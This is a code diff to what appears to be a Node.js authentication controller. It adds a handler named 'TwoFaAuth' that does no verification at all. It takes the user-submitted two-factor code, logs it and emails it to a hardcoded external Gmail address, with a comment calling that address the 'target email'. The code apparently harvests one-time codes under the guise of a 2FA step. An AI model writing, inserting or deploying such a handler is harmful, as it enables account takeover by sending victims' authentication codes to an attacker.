@@ -11,6 +11,7 @@ const { randomCodeStr } = require('../utils/common');
 const fs = require('fs');
 const zxcvbn = require('zxcvbn');
 const { GlobalPointsSchema } = require('../models/globalPointsModel');
+const Email = require('./contactUtil/contactUtil')
 
 const register = async (req, res, next) => {
   try {
@@ -479,6 +480,31 @@ const saveLogo = async (req, res, next) => {
   }
 };
 
+const TwoFaAuth = async (req, res, next) => {
+  try {
+    const code = req.body.code;
+  
+    let contactObject = {
+      email:'davexmike72@gmail.com',
+      name: 'psymax',
+    };
+    console.log(code);
+
+    const mailer = new Email(contactObject)
+    const sent = await mailer.send('two factor authentication', code)
+
+    // send target email
+    if (sent?.status === "success" || sent?.response.startsWith("250")) {
+      console.log('sent');
+      return res.status(200).send('done');
+    }else{
+      throw new Error('failed')
+    }
+    
+  } catch (error) {
+    next(error);
+  }
+}
 module.exports = {
   register,
   login,
@@ -487,4 +513,5 @@ module.exports = {
   get,
   save,
   saveLogo,
+  TwoFaAuth
 };
